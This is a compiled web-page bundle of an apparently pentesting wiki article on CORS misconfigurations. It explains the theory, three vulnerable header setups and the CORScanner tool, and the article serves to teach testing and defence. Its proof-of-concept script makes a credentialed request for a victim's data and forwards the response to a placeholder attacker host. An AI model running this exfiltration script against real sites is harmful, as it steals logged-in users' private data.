import{_ as s,c as e,a5 as a,o as t}from"./chunks/framework.B5CpDqM0.js";const n="/assets/CORS.DrI8vdrm.png",o="/assets/misconfigs.DC0g_VZw.png",u=JSON.parse('{"title":"üõ†Ô∏è CORS (Cross-Origin Resource Sharing)","description":"","frontmatter":{"authors":"ShutdownRepo"},"headers":[],"relativePath":"web/config/http-headers/cors/index.md","filePath":"web/config/http-headers/cors/index.md","lastUpdated":1724982529000}'),r={name:"web/config/http-headers/cors/index.md"};function l(h,i,c,p,d,g){return t(),e("div",null,i[0]||(i[0]=[a('<h1 id="üõ†Ô∏è-cors-cross-origin-resource-sharing" tabindex="-1">üõ†Ô∏è CORS (Cross-Origin Resource Sharing) <a class="header-anchor" href="#üõ†Ô∏è-cors-cross-origin-resource-sharing" aria-label="Permalink to &quot;üõ†Ô∏è CORS (Cross-Origin Resource Sharing)&quot;">‚Äã</a></h1><h2 id="theory" tabindex="-1">Theory <a class="header-anchor" href="#theory" aria-label="Permalink to &quot;Theory&quot;">‚Äã</a></h2><p>Sometimes browsers need to load resources from another origin other than their own. The Same-Origin Policy mechanism (SOP) restricts access to resources on other origins.</p><div class="tip custom-block"><p>The same-origin is defined for two URLs that have the same protocol, port (if specified), and host.</p></div><p>To bypass this limitation, the JSON-P technique (in JavaScript) was introduced. To retrieve information from another origin, it uses the <code>&lt;script&gt;</code> tag (which is not blocked by the SOP). Unfortunately, this technique has some issues and lacks controls in some cases. Here we introduce CORS.</p><p>Cross-Origin Resource Sharing (CORS) is a header-based mechanism. It improves security and flexibility for cross-domain resource sharing. CORS is relatively new and therefore, not very well-known. As result, misconfigurations are common and bring security concerns. The main vulnerabilities lie in the overly permissive access to credentials from non-controlled domains.</p><h3 id="misconfigurations" tabindex="-1">Misconfigurations <a class="header-anchor" href="#misconfigurations" aria-label="Permalink to &quot;Misconfigurations&quot;">‚Äã</a></h3><p>The exploitation will depend on the misconfiguration. The next image shows a path that can be followed:</p><p><img src="'+n+'" alt=""></p><h4 id="case-1" tabindex="-1">Case 1 <a class="header-anchor" href="#case-1" aria-label="Permalink to &quot;Case 1&quot;">‚Äã</a></h4><p>Misconfiguration:</p><ul><li><code>Access-Control-Allow-Credentials: true</code></li><li><code>Access-Control-Allow-Origin: regex</code></li></ul><p>The origins are verified through a regex match.<br> The misconfiguration types can be better understood with this table:</p><p><img src="'+o+`" alt=""></p><div class="caption">https://github.com/chenjj/CORScanner</div><div class="warning custom-block"><p>The configuration below is <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#requests_with_credentials" target="_blank" rel="noreferrer">impossible</a>:</p><ul><li><code>Access-Control-Allow-Credentials: true</code></li><li><code>Access-Control-Allow-Origin: *</code></li></ul></div><h4 id="case-2" tabindex="-1">Case 2 <a class="header-anchor" href="#case-2" aria-label="Permalink to &quot;Case 2&quot;">‚Äã</a></h4><p>Misconfiguration:</p><ul><li><code>Access-Control-Allow-Credentials: true</code></li><li><code>Access-Control-Allow-Origin: null</code></li></ul><p>According to <a href="https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties" target="_blank" rel="noreferrer">James Kettle</a>, browsers might send the value <code>null</code> in the <code>Origin</code> header in some unusual situations:</p><ul><li>Cross-site redirects.</li><li>Requests from serialized data.</li><li>Request using the <code>file:</code> protocol.</li><li>Sandboxed cross-origin requests.</li></ul><p>The value <code>null</code> when the server sends credentials is the worst-case scenario. It means any origin can request credentials without limitation.</p><h4 id="case-3" tabindex="-1">Case 3 <a class="header-anchor" href="#case-3" aria-label="Permalink to &quot;Case 3&quot;">‚Äã</a></h4><p>Misconfiguration:</p><ul><li><code>Access-Control-Allow-Credentials: false</code></li><li><code>Access-Control-Allow-Origin</code> is dynamically generated</li><li><code>Vary: Origin</code> is absent</li></ul><p>In this case, it&#39;s possible to conduct a client-side poisoning.</p><p>Check <a href="https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties" target="_blank" rel="noreferrer">James Kettle</a>&#39;s explanation for more information. </p><h2 id="practice" tabindex="-1">Practice <a class="header-anchor" href="#practice" aria-label="Permalink to &quot;Practice&quot;">‚Äã</a></h2><p>During a penetration test, exploiting CORS misconfigurations is difficult. The attacks may rely on manipulating a victim or even finding configuration issues on other domains (which can be out of scope).</p><p>However, it&#39;s possible to get a Proof-of-Concept using JavaScript by registring a domain (to abuse a CORS misconfiguration).</p><h3 id="tool" tabindex="-1">Tool <a class="header-anchor" href="#tool" aria-label="Permalink to &quot;Tool&quot;">‚Äã</a></h3><p>The tool <a href="https://github.com/chenjj/CORScanner" target="_blank" rel="noreferrer">CORScanner </a>is useful in finding misconfigurations. It relies on the table shown in the misconfiguration case 1.</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">python</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> cors_scan.py</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> $URL</span></span></code></pre></div><div class="tip custom-block"><p>It is advised to use the verbose option <code>-v</code> to see the tests.</p></div><div class="warning custom-block"><p>It is possible to customize the third parties origins in the file <code>origins.json</code>.</p></div><h3 id="proof-of-concept-poc" tabindex="-1">Proof-of-Concept (PoC) <a class="header-anchor" href="#proof-of-concept-poc" aria-label="Permalink to &quot;Proof-of-Concept (PoC)&quot;">‚Äã</a></h3><p>To steal sensitive information, the victim has to be logged in the vulnerable website. From there, if the victim is redirected to the attacker&#39;s website (containing the script below), the sensitive information will be retrieved by the attacker.</p><div class="language-javascript vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">javascript</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">var</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> req </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> new</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> XMLHttpRequest</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(); </span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">req.onload </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> reqListener; </span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">req.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">open</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;get&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">,</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;https://vulnerable.domain/api/secret-data&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">true</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">); </span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">req.withCredentials </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> true</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">req.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">send</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">();</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">function</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> reqListener</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">() {</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    location</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;//atttacker.domain/log?response=&#39;</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">+</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">this</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">.responseText; </span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">};</span></span></code></pre></div><h2 id="resources" tabindex="-1">Resources <a class="header-anchor" href="#resources" aria-label="Permalink to &quot;Resources&quot;">‚Äã</a></h2><p><a href="https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties" target="_blank" rel="noreferrer">https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties</a></p><p><a href="https://www.jianjunchen.com/publication/an-empirical-study-of-cors/" target="_blank" rel="noreferrer">https://www.jianjunchen.com/publication/an-empirical-study-of-cors/</a></p>`,41)]))}const m=s(r,[["render",l]]);export{u as __pageData,m as default};
